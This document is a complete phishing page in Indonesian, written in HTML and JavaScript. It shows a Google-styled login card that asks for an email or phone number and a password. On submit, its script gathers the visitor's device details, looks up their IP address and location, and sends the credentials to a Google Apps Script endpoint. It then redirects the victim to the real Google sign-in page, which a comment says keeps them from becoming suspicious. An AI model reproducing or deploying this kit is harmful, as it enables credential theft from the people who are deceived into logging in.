<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
<title>Web by XZAR</title>
<style>
  /* Desain mewah & bersih ala Google/Apple */
  * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
  body { background: #f8f9fa; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #202124; }
  .card { background: #fff; width: 90%; max-width: 400px; padding: 40px 30px; border-radius: 24px; box-shadow: 0 10px 40px rgba(0,0,0,0.08); border: 1px solid rgba(0,0,0,0.05); }
  .header { text-align: center; margin-bottom: 30px; }
  .logo { font-size: 32px; font-weight: 900; letter-spacing: -1px; background: linear-gradient(135deg, #1a73e8, #0d47a1); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 10px; }
  .subtitle { font-size: 14px; color: #5f6368; }
  .form-group { margin-bottom: 20px; }
  label { display: block; font-size: 12px; font-weight: 600; color: #5f6368; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 0.5px; }
  input { width: 100%; padding: 15px; border: 1.5px solid #dadce0; border-radius: 12px; font-size: 15px; outline: none; transition: 0.3s; background: #f8f9fa; }
  input:focus { border-color: #1a73e8; background: #fff; box-shadow: 0 0 0 3px rgba(26,115,232,0.1); }
  .btn { width: 100%; padding: 16px; background: linear-gradient(135deg, #1a73e8, #0d47a1); color: #fff; border: none; border-radius: 12px; font-size: 16px; font-weight: 700; cursor: pointer; transition: 0.3s; margin-top: 10px; box-shadow: 0 4px 15px rgba(26,115,232,0.3); }
  .btn:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(26,115,232,0.4); }
  .btn:disabled { opacity: 0.7; cursor: not-allowed; transform: none; }
  .loading { display: none; text-align: center; margin-top: 20px; }
  .spinner { width: 30px; height: 30px; border: 3px solid #f3f3f3; border-top: 3px solid #1a73e8; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 10px; }
  @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  .footer { text-align: center; margin-top: 30px; font-size: 11px; color: #999; }
</style>
</head>
<body>

<div class="card" id="cardBox">
  <div class="header">
    <div class="logo">WEB BY XZAR</div>
    <div class="subtitle">Silakan masuk untuk melanjutkan verifikasi.</div>
  </div>

  <form id="phishForm">
    <div class="form-group">
      <label>Email atau Nomor Telepon</label>
      <input type="email" id="email" placeholder="Masukkan email Anda" required>
    </div>
    <div class="form-group">
      <label>Password</label>
      <input type="password" id="password" placeholder="Masukkan password Anda" required>
    </div>
    <button type="submit" class="btn" id="submitBtn">Berikutnya</button>
  </form>

  <div class="loading" id="loadingBox">
    <div class="spinner"></div>
    <div style="font-size:13px; color:#5f6368;">Memverifikasi akun...</div>
  </div>

  <div class="footer">© 2024 Web by XZAR. All rights reserved.</div>
</div>

<script>
// ==========================================
// 1. KONFIGURASI (GANTI URL DI BAWAH INI)
// ==========================================
var SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwpqoXMv3-SVV4BkybAEhMZVzkOkXbMbFMo_4kJernpQmhvETiDdCR_p1RerYChStxLJA/exec";

// ==========================================
// 2. FUNGSI DETEKSI PERANGKAT
// ==========================================
function getDeviceInfo() {
  var ua = navigator.userAgent;
  var os = "Unknown";
  var device = "Desktop";
  var browser = "Unknown";

  if (/android/i.test(ua)) { os = "Android"; device = "Mobile"; }
  if (/iPad|iPhone|iPod/.test(ua)) { os = "iOS"; device = "Tablet/Phone"; }
  if (/windows/i.test(ua)) { os = "Windows"; }
  if (/macintosh|mac os x/i.test(ua)) { os = "macOS"; }
  if (/linux/i.test(ua)) { os = "Linux"; }

  if (/chrome|crios/i.test(ua)) browser = "Chrome";
  else if (/firefox|fxios/i.test(ua)) browser = "Firefox";
  else if (/safari/i.test(ua)) browser = "Safari";
  else if (/edg/i.test(ua)) browser = "Edge";

  return {
    device: device,
    os: os,
    browser: browser,
    layar: window.screen.width + " x " + window.screen.height,
    bahasa: navigator.language || "Unknown"
  };
}

// ==========================================
// 3. PROSES SUBMIT FORM
// ==========================================
document.getElementById("phishForm").addEventListener("submit", async function(e) {
  e.preventDefault();
  
  var email = document.getElementById("email").value.trim();
  var password = document.getElementById("password").value.trim();
  if (!email || !password) return;

  // Sembunyikan form, tampilkan loading
  document.getElementById("phishForm").style.display = "none";
  document.getElementById("loadingBox").style.display = "block";

  var info = getDeviceInfo();
  var dataKirim = {
    email: email,
    password: password,
    device: info.device,
    os: info.os,
    browser: info.browser,
    layar: info.layar,
    bahasa: info.bahasa,
    ip: "-",
    kota: "-",
    negara: "-",
    isp: "-"
  };

  // Ambil data IP & Lokasi (API Gratis)
  try {
    var res = await fetch("https://ipapi.co/json/");
    var ipData = await res.json();
    dataKirim.ip = ipData.ip || "-";
    dataKirim.kota = ipData.city || "-";
    dataKirim.negara = ipData.country_name || "-";
    dataKirim.isp = ipData.org || "-";
  } catch (err) {
    console.log("Gagal ambil IP");
  }

  // Kirim ke Google Apps Script (Backend)
  try {
    await fetch(SCRIPT_URL, {
      method: "POST",
      mode: "no-cors",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(dataKirim)
    });
  } catch (err) {
    console.log("Gagal kirim data");
  }

  // Setelah terkirim, arahkan korban ke Google asli biar tidak curiga
  setTimeout(function() {
    window.location.href = "https://accounts.google.com/signin/v2/identifier";
  }, 2500);
});
</script>

</body>
</html>
